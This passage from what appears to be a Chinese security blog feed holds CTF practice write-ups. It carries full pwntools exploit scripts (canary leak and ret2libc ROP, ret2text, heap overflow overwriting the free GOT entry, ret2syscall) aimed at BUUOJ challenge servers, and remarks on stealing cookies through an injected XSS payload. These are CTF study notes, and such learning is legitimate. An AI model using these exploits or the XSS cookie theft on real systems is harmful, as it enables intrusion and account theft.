$helper-&gt;execute_dml($sql2);</span><br><span class="hljs-variable">$res2</span> = <span class="hljs-variable">$helper</span>-&gt;execute_dml(<span class="hljs-variable">$xss</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$res1</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$res2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;更新成功&#x27;)&lt;/script&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;更新失败&#x27;)&lt;/script&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>插入成功：<br><img src="https://i.loli.net/2021/05/07/8zsjDOkQIygXSxu.png"></p><p>回到info.php界面，F12查看源代码可以发现我们在页面插入的xss，再利用xss平台可以获取到cookie等信息<br>插入xss代码后，再次打开该界面CPU占用率和内存会非常高，不知为什么（害怕）</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>协会报告</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUOJ刷题记录</title>
    <link href="/2021/03/31/BUUOJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/03/31/BUUOJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p>格式化字符串，可以泄露出canary的值</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27286</span>)<br><span class="hljs-comment"># p = process(&#x27;./bjdctf_2020_babyrop2&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0000000000400993</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>vuln = elf.symbols[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    gdb.attach(p)<br>    raw_input(<span class="hljs-string">&#x27;en..&#x27;</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br>ru(<span class="hljs-string">&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)<br>sl(<span class="hljs-string">&#x27;aa%7$p&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>((p.recv(<span class="hljs-number">16</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-comment"># log.success(&#x27;canary:0x%d&#x27; % canary)</span><br><br>ru(<span class="hljs-string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">0x8</span>) + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>sl(payload)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>ru(<span class="hljs-string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">0x8</span>) + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(binsh) + p64(sys) + p64(main)<br>sl(payload)<br>p.interactive()<br><span class="hljs-comment"># debug()</span><br></code></pre></div></td></tr></table></figure><h2 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj_test_your_memory"></a>jarvisoj_test_your_memory</h2><p>ret2txt，顺便温习了函数调用栈的结构</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>LOCAL = <span class="hljs-number">0</span><br>catflag = <span class="hljs-number">0x080487E0</span><br>system = <span class="hljs-number">0x080485BD</span><br><br><span class="hljs-keyword">if</span> LOCAL:<br>    p = process(<span class="hljs-string">&#x27;./memory&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28711</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>+<span class="hljs-number">4</span>) + p32(system) +p32(system) + p32(catflag)<br><span class="hljs-comment"># ru(&quot;&gt; &quot;)</span><br>sl(payload)<br>it()<br></code></pre></div></td></tr></table></figure><h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>命令执行，利用的是linux下可使用;分隔两条指令执行，直接<code>cat flag</code></p><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a>picoctf_2018_buffer overflow 1</h2><p>没什么好说的</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>LOCAL = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> LOCAL:<br>    p = process(<span class="hljs-string">&#x27;./bjdctf_2020_router&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28570</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br>win = <span class="hljs-number">0x080485CB</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>+<span class="hljs-number">4</span>) + p32(win)<br>sl(payload)<br>it()<br></code></pre></div></td></tr></table></figure><h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>重点在于update时条件的绕过</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">sub_8048724</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> __int8 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [esp+17h] [ebp-11h]</span><br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( a1 &lt; (<span class="hljs-keyword">unsigned</span> __int8)USER_NUM &amp;&amp; ptr[a1] )<br>  &#123;<br>    v3 = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;text length: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%u%c&quot;</span>, &amp;v3, &amp;v2);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">char</span> *)(v3 + *(_DWORD *)ptr[a1]) &gt;= (<span class="hljs-keyword">char</span> *)ptr[a1] - <span class="hljs-number">4</span> ) <br>    <span class="hljs-comment">//如果输入的desc长度v3加上desc地址&gt;=结构体地址，则退出程序；很明显，只有对于紧挨着的堆块才用，所以可以申请多个堆块，然后释放掉第一个，再申请一个可以包含desc0和结构体0的堆，这样后来申请的结构体只能排到堆块队列的最后，这样就可以轻松堆溢出了</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;text: &quot;</span>);<br>    sub_80486BB(*(_DWORD *)ptr[a1], v3 + <span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v4;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>LOCAL = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> LOCAL:<br>    p = process(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26486</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>    gdb.attach(p)<br>    raw_input(<span class="hljs-string">&#x27;en..&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">desc_size, name, text_len, text</span>):</span><br>    ru(<span class="hljs-string">&#x27;Action: &#x27;</span>)<br>    sl(<span class="hljs-number">0</span>)<br>    ru(<span class="hljs-string">&#x27;description: &#x27;</span>)<br>    sl(desc_size)<br>    ru(<span class="hljs-string">&#x27;name: &#x27;</span>)<br>    sl(name)<br>    ru(<span class="hljs-string">&#x27;text length: &#x27;</span>)<br>    sl(text_len)<br>    ru(<span class="hljs-string">&#x27;text: &#x27;</span>)<br>    sl(text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27;Action: &#x27;</span>)<br>    sl(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;index: &#x27;</span>)<br>    sl(idx)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">display</span>(<span class="hljs-params">idx</span>):</span><br>    ru(<span class="hljs-string">&#x27;Action: &#x27;</span>)<br>    sl(<span class="hljs-number">2</span>)<br>    ru(<span class="hljs-string">&#x27;index: &#x27;</span>)<br>    sl(idx)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">idx, text_len, text</span>):</span><br>    ru(<span class="hljs-string">&#x27;Action: &#x27;</span>)<br>    sl(<span class="hljs-number">3</span>)<br>    ru(<span class="hljs-string">&#x27;index: &#x27;</span>)<br>    sl(idx)<br>    ru(<span class="hljs-string">&#x27;text length: &#x27;</span>)<br>    sl(text_len)<br>    ru(<span class="hljs-string">&#x27;text: &#x27;</span>)<br>    sl(text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>) <br>    add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;cccccccc&#x27;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;dddddddd&#x27;</span>)<br>    add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>    <span class="hljs-comment"># debug()</span><br>    delete(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># payload = &#x27;a&#x27;*0x198 + p32(free_got)</span><br>    payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span><br>    payload += p32(<span class="hljs-number">0</span>)<br>    payload += p32(<span class="hljs-number">0x89</span>)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span><br>    payload += p32(<span class="hljs-number">0</span>)<br>    payload += p32(<span class="hljs-number">0x89</span>)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span><br>    payload += p32(<span class="hljs-number">0</span>)<br>    payload += p32(<span class="hljs-number">0x89</span>)<br>    payload += p32(free_got)<br>    log.success(<span class="hljs-string">&#x27;len: %d&#x27;</span> % <span class="hljs-built_in">len</span>(payload))<br>    add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>, <span class="hljs-number">0x19c</span>, payload)<br>    display(<span class="hljs-number">1</span>)<br>    ru(<span class="hljs-string">&#x27;description: &#x27;</span>)<br>    free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>    log.success(<span class="hljs-string">&#x27;free addr: 0x%x&#x27;</span> % free_addr)<br>    libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>    libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>    system = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>    payload = p32(system)<br>    update(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(payload), payload)<br>    delete(<span class="hljs-number">2</span>)<br>    it()<br>    <span class="hljs-comment"># debug()</span><br><br>exp()<br></code></pre></div></td></tr></table></figure><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>ret2syscall</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25213</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :p.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>it      = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br>pop_eax_ret = <span class="hljs-number">0x080bae06</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806e850</span><br>sh = <span class="hljs-number">0x080be237</span><br>int0x80 = <span class="hljs-number">0x080493e1</span><br>bss_addr = <span class="hljs-number">0x080eaf80</span><br>read_addr = <span class="hljs-number">0x0806CD50</span><br><br>ru(<span class="hljs-string">&#x27;Your input :&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x1c</span>+<span class="hljs-number">4</span>)<br>payload += p32(read_addr)<br>payload += p32(pop_edx_ecx_ebx_ret)<br>payload += p32(<span class="hljs-number">0</span>) + p32(bss_addr) + p32(<span class="hljs-number">8</span>)<br>payload += p32(pop_eax_ret) + p32(<span class="hljs-number">0xb</span>)<br>payload += p32(pop_edx_ecx_ebx_ret) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(bss_addr) + p32(int0x80)<br>sl(payload)<br>sl(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>it()<br></code></pre></div></td></tr></table></figure><h2 id="linkctf-2018-7-babypie-安恒月赛"><a href="#linkctf-2018-7-babypie-安恒月赛" class="headerlink" title="linkctf_2018.7_babypie(安恒月赛)"></a>linkctf_2018.7_babypie(安恒月赛)</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 